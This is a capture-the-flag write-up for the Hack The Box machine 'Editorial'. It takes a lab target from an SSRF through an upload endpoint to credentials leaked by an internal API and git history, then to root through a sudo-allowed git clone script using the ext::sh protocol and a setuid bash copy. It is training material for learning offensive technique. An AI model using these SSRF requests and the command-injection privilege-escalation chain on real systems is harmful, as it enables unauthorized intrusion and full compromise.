# Target
| Category          | Details                                                    |
|-------------------|------------------------------------------------------------|
| 📝 **Name**       | [Editorial](https://app.hackthebox.com/machines/Editorial) |  
| 🏷 **Type**       | HTB Machine                                                |
| 🖥 **OS**         | Linux                                                      |
| 🎯 **Difficulty** | Easy                                                       |
| 📁 **Tags**       | SSRF, Python, git                                          |

# Scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Attack path
1. [Gain foothold using discovered credentials](#gain-foothold-using-discovered-credentials)
2. [Escalate to `prod` user using discovered credentials](#escalate-to-prod-user-using-discovered-credentials)
3. [Escalate to `root` user using git `ext::sh://` external protocol](#escalate-to-root-user-using-git-extsh-external-protocol) 

### Gain foothold using discovered credentials

#### Add `editorial.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Editorial]
└─$ echo "$TARGET editorial.htb" | sudo tee -a /etc/hosts
10.129.50.54 editorial.htb
```

#### Start netcat to analyze inbound HTTP request
```
┌──(magicrc㉿perun)-[~/attack/HTB Editorial]
└─$ nc -lnvp 8000
listening on [any] 8000 ...
```

#### Trigger HTTP request to netcat with `/upload-cover` endpoint
```
┌──(magicrc㉿perun)-[~/attack/HTB Editorial]
└─$ LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1)
curl http://editorial.htb/upload-cover -F "bookurl=http://$LHOST:8000" -F "bookfile=;filename="
/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg
```

#### Analyze inbound HTTP request
```
connect to [10.10.14.161] from (UNKNOWN) [10.129.50.54] 55006
GET / HTTP/1.1
Host: 10.10.14.161:8000
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

`User-Agent: python-requests/2.25.1` suggests Python backend application 

#### Discover REST API of local backend Python application using SSRF 
```
┌──(magicrc㉿perun)-[~/attack/HTB Editorial]
└─$ FILE=$(curl -s http://editorial.htb/upload-cover -F "bookurl=http://127.0.0.1:5000" -F "bookfile=;filename=")
curl -s http://editorial.htb/$FILE | jq
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```

#### Enumerate REST API endpoints to discover credentials for user `dev`
```
┌──(magicrc㉿perun)-[~/attack/HTB Editorial]
└─$ FILE=$(curl -s http://editorial.htb/upload-cover -F "bookurl=http://127.0.0.1:5000/api/latest/metadata/messages/authors" -F "bookfile=;filename=")
curl -s http://editorial.htb/$FILE | jq
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
}
```

#### Use discovered credentials to gain access over SSH
```
┌──(magicrc㉿perun)-[~/attack/HTB Editorial]
└─$ ssh dev@editorial.htb
dev@editorial.htb's password: 
<SNIP>
dev@editorial:~$ id
uid=1001(dev) gid=1001(dev) groups=1001(dev)
```

### Escalate to `prod` user using discovered credentials

#### Discover git repository in `apps` directory
```
dev@editorial:~$ ls -la apps/
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5  2024 .
drwxr-x--- 4 dev dev 4096 Jun  5  2024 ..
drwxr-xr-x 8 dev dev 4096 Jun  5  2024 .git
```

#### Reset the files to the last committed state
```
dev@editorial:~$ cd apps; git checkout .
Updated 52 paths from the index
```

#### Enumerate git history to discover credentials for user `prod`
```
dev@editorial:~/apps$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
 
 # -------------------------------
 ```

#### Use discovered credentials to gain access over SSH
```
┌──(magicrc㉿perun)-[~/attack/HTB Editorial]
└─$ ssh prod@editorial.htb
prod@editorial.htb's password: 
<SNIP>
prod@editorial:~$ id
uid=1000(prod) gid=1000(prod) groups=1000(prod)
```

### Escalate to `root` user using git `ext::sh://` external protocol

#### List allowed sudo commands
```
prod@editorial:~$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

#### Locate vulnerability in `clone_prod_change.py`
Vulnerability exists in line 12, `-c protocol.ext.allow=always` allows usage of `ext::` protocols.
```
prod@editorial:~$ cat -n /opt/internal_apps/clone_changes/clone_prod_change.py
     1  #!/usr/bin/python3
     2
     3  import os
     4  import sys
     5  from git import Repo
     6
     7  os.chdir('/opt/internal_apps/clone_changes')
     8
     9  url_to_clone = sys.argv[1]
    10
    11  r = Repo.init('', bare=True)
    12  r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

#### Exploit vulnerability to spawn root shell
```
prod@editorial:~$ echo "cp /bin/bash /tmp/root_shell && chmod +s /tmp/root_shell" > /tmp/exploit.sh && chmod +x /tmp/exploit.sh && \
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py ext::sh\ -c\ '/tmp/exploit.sh' 2> /dev/null; \
sleep 1 && \
/tmp/root_shell -p
[sudo] password for prod: 
root_shell-5.1# id
uid=1000(prod) gid=1000(prod) euid=0(root) egid=0(root) groups=0(root),1000(prod)
```
